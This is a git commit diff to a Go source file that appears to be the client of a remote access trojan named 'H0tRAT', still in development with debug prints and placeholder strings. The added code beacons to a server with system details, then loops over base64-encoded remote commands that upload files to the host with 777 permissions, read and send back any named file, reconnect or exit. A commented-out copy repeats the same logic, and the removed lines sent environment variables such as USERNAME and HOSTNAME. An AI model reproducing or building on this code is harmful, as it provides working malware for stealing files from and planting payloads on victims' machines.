8360431de5de31aa9c0bec1581213d238b568727
ylc <80378994@qq.com>
2023-02-09 17:49:41 +0800

    aaaaaaaa

--- src/demo/client/ma.go
+++ src/demo/client/ma.go
@@ -1,11 +1,16 @@
 package client
 
 import (
+	"bufio"
 	"encoding/base64"
 	"fmt"
+	"io"
+	"io/ioutil"
 	"net"
 	"os"
+	"runtime"
 	"strconv"
+	"strings"
 )
 
 const (
@@ -19,62 +24,173 @@ const (
 	VERSION = "1.0.0"
 )
 
+var isturn = true
+
 func Ma() {
-	connect()
-}
 
-// 连接远程服务器
-func connect() {
-	//建立tcp连接
-
-	conn, err := net.Dial("tcp", IP)
-	//连接失败进行重连
-	if err != nil {
-		fmt.Println("Connection...")
-		for {
-			connect()
-
-		}
-	}
-	errMsg := base64.URLEncoding.EncodeToString([]byte(CONNPWD))
-	conn.Write([]byte(string(errMsg) + "\n"))
-	//连接成功
-	fmt.Println("Connection success...")
-	maConnet()
+	connetNew()
 
 }
 
-func maConnet() {
-	socket, err := net.Dial("tcp", "127.0.0.1:1010")
+func connetNew() {
+	a := 1 + 1
+	fmt.Println(a)
+	fmt.Println("aaaaaaaaaaa")
+	//inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "127.0.0.1:1010")
+	//socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
+	//if err != nil {
+	//	fmt.Println(err)
+	//}
+	//defer socket.Close()
+	//
+	//// IO流
+	//dataOutputStream := bufio.NewWriter(socket)
+	//defer dataOutputStream.Flush()
+	//
+	//// 发送信息
+	//fmt.Fprintln(dataOutputStream, "H0tRAT")
+	//fmt.Fprintln(dataOutputStream, "USER")
+	//fmt.Fprintln(dataOutputStream, "HOSTNAME")
+	//fmt.Fprintln(dataOutputStream, runtime.GOOS)
+	//fmt.Fprintln(dataOutputStream, IP)
+	//fmt.Fprintln(dataOutputStream, "测试地址")
+	//fmt.Fprintln(dataOutputStream, "测试名字")
+	//fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
+	//fmt.Fprintln(dataOutputStream, "测试")
+	//fmt.Fprintln(dataOutputStream, VERSION)
+	//fmt.Fprintln(dataOutputStream, "360")
+	//for {
+	//	time.Sleep(1)
+	//}
+	//fmt.Println("abc")
+	////传送心跳
+	//go heartRun(socket)
+	//go func() {
+	//	fmt.Println("Connettttt")
+	//	dataInputStream := bufio.NewReader(socket)
+	//	for {
+	//		// 读取服务端发送的数据
+	//		message, err := dataInputStream.ReadString('\n')
+	//		if err != nil {
+	//			// 如果服务器断开，则重新连接
+	//			socket.Close()
+	//			connetNew()
+	//		}
+	//
+	//		// 收到指令base64解码
+	//		decodedCase, _ := base64.StdEncoding.DecodeString(message)
+	//		command := string(decodedCase)
+	//		cmdParameter := strings.Split(command, " ")
+	//		switch cmdParameter[0] {
+	//		case "back":
+	//			socket.Close()
+	//			connetNew()
+	//		case "exit":
+	//			socket.Close()
+	//			os.Exit(0)
+	//
+	//		case "upload":
+	//			uploadOutput, _ := bufio.NewReader(socket).ReadString('\n')
+	//			decodeOutput, _ := base64.StdEncoding.DecodeString(uploadOutput)
+	//			encData, _ := bufio.NewReader(socket).ReadString('\n')
+	//			decData, _ := base64.URLEncoding.DecodeString(encData)
+	//			ioutil.WriteFile(string(decodeOutput), []byte(decData), 777)
+	//
+	//		case "download":
+	//			// 第一步收到下载指令,什么都不做，继续等待下载路径
+	//			download, _ := bufio.NewReader(socket).ReadString('\n')
+	//			decodeDownload, _ := base64.StdEncoding.DecodeString(download)
+	//			file, err := ioutil.ReadFile(string(decodeDownload))
+	//			if err != nil {
+	//				// 找不到文件，发送错误消息
+	//				errMsg := base64.URLEncoding.EncodeToString([]byte("[!] File not found!"))
+	//				socket.Write([]byte(string(errMsg) + "\n"))
+	//				break
+	//			}
+	//			//发送一个download指令给服务器端准备接收
+	//			srvDownloadMsg := base64.URLEncoding.EncodeToString([]byte("download"))
+	//			socket.Write([]byte(string(srvDownloadMsg) + "\n"))
+	//			//读文件上传
+	//			encData := base64.URLEncoding.EncodeToString(file)
+	//			socket.Write([]byte(string(encData) + "\n"))
+	//
+	//		}
+	//	}
+	//}()
+
+}
+
+func maConnetNew() {
+	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "127.0.0.1:1010")
+	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
 	if err != nil {
-		panic(err)
+		fmt.Println(err)
 	}
 	defer socket.Close()
 
-	socket.Write([]byte(HEAD))
-	socket.Write([]byte(os.Getenv("USERNAME")))
-	socket.Write([]byte(os.Getenv("HOSTNAME")))
-	socket.Write([]byte(os.Getenv("OS")))
-	socket.Write([]byte(IP))
-	socket.Write([]byte("测试地址"))
-	socket.Write([]byte("测试名字"))
-	socket.Write([]byte(strconv.Itoa(1111)))
-	socket.Write([]byte("测试"))
-	socket.Write([]byte(VERSION))
-	fmt.Println("aaaaaaaaaaaaaa")
-	//IP := "127.0.0.1"
-	//writer := bufio.NewWriter(socket)
+	// IO流
+	dataOutputStream := bufio.NewWriter(socket)
+	defer dataOutputStream.Flush()
 
-	//binary.Write(writer, binary.LittleEndian, []byte(HEAD))
-	//binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("USERNAME")))
-	//binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("HOSTNAME")))
-	//binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("OS")))
-	//binary.Write(writer, binary.LittleEndian, []byte(IP))
-	//binary.Write(writer, binary.LittleEndian, []byte("测试地址"))
-	//binary.Write(writer, binary.LittleEndian, []byte("测试名字"))
-	//binary.Write(writer, binary.LittleEndian, []byte(strconv.Itoa(1111)))
-	//binary.Write(writer, binary.LittleEndian, []byte("测试"))
-	//binary.Write(writer, binary.LittleEndian, []byte(VERSION))
-	//writer.Flush()
+	// 发送信息
+	fmt.Fprintln(dataOutputStream, "H0tRAT")
+	fmt.Fprintln(dataOutputStream, "USER")
+	fmt.Fprintln(dataOutputStream, "HOSTNAME")
+	fmt.Fprintln(dataOutputStream, runtime.GOOS)
+	fmt.Fprintln(dataOutputStream, IP)
+	fmt.Fprintln(dataOutputStream, "测试地址")
+	fmt.Fprintln(dataOutputStream, "测试名字")
+	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
+	fmt.Fprintln(dataOutputStream, "测试")
+	fmt.Fprintln(dataOutputStream, VERSION)
+	fmt.Fprintln(dataOutputStream, "360")
 
+	for {
+		fmt.Println("bbbbbbbbbbbbbbb")
+		// IO流
+		message, err := bufio.NewReader(socket).ReadString('\n')
+		if err == io.EOF {
+			// 如果服务器断开，则重新连接
+			socket.Close()
+			maConnetNew()
+		}
+		// 收到指令base64解码
+		decodedCase, _ := base64.StdEncoding.DecodeString(message)
+		command := string(decodedCase)
+		cmdParameter := strings.Split(command, " ")
+		switch cmdParameter[0] {
+		case "back":
+			socket.Close()
+			maConnetNew()
+		case "exit":
+			socket.Close()
+			os.Exit(0)
+
+		case "upload":
+			uploadOutput, _ := bufio.NewReader(socket).ReadString('\n')
+			decodeOutput, _ := base64.StdEncoding.DecodeString(uploadOutput)
+			encData, _ := bufio.NewReader(socket).ReadString('\n')
+			decData, _ := base64.URLEncoding.DecodeString(encData)
+			ioutil.WriteFile(string(decodeOutput), []byte(decData), 777)
+
+		case "download":
+			// 第一步收到下载指令,什么都不做，继续等待下载路径
+			download, _ := bufio.NewReader(socket).ReadString('\n')
+			decodeDownload, _ := base64.StdEncoding.DecodeString(download)
+			file, err := ioutil.ReadFile(string(decodeDownload))
+			if err != nil {
+				// 找不到文件，发送错误消息
+				errMsg := base64.URLEncoding.EncodeToString([]byte("[!] File not found!"))
+				socket.Write([]byte(string(errMsg) + "\n"))
+				break
+			}
+			//发送一个download指令给服务器端准备接收
+			srvDownloadMsg := base64.URLEncoding.EncodeToString([]byte("download"))
+			socket.Write([]byte(string(srvDownloadMsg) + "\n"))
+			//读文件上传
+			encData := base64.URLEncoding.EncodeToString(file)
+			socket.Write([]byte(string(encData) + "\n"))
+
+		}
+	}
 }
